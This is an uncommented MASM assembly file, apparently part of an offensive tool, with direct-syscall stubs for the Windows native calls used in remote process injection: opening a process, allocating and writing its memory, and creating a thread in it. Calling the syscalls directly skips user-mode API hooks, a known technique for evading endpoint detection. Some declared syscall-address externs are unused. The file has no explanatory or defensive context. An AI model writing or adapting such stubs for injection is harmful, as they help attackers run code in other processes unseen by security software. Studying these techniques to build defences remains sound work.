.data
extern wNtOpenProcess:DWORD
extern wNtAllocateVirtualMemory:DWORD
extern wNtWriteVirtualMemory:DWORD
extern wNtCreateThreadEx:DWORD
extern wNtWaitForSingleObject:DWORD
extern wNtClose:DWORD

extern sysAddrNtOpenProcess:QWORD
extern sysAddrNtAllocateVirtualMemory:QWORD
extern sysAddrNtWriteVirtualMemory:QWORD
extern sysAddrNtCreateThreadEx:QWORD
extern sysAddrNtWaitForSingleObject:QWORD
extern sysAddrNtClose:QWORD

.code
NtOpenProcess proc
	mov r10, rcx
	mov eax, wNtOpenProcess
	syscall
	ret
NtOpenProcess endp

NtAllocateVirtualMemory proc
	mov r10, rcx
	mov eax, wNtAllocateVirtualMemory
	syscall
	ret
NtAllocateVirtualMemory endp

NtWriteVirtualMemory proc
	mov r10, rcx
	mov eax, wNtWriteVirtualMemory
	syscall
	ret
NtWriteVirtualMemory endp

NtCreateThreadEx proc
	mov r10, rcx
	mov eax, wNtCreateThreadEx
	syscall
	ret
NtCreateThreadEx endp

NtWaitForSingleObject proc
	mov r10, rcx
	mov eax, wNtWaitForSingleObject
	syscall
	ret
NtWaitForSingleObject endp

NtClose proc
	mov r10, rcx
	mov eax, wNtClose
	syscall
	ret
NtClose endp
end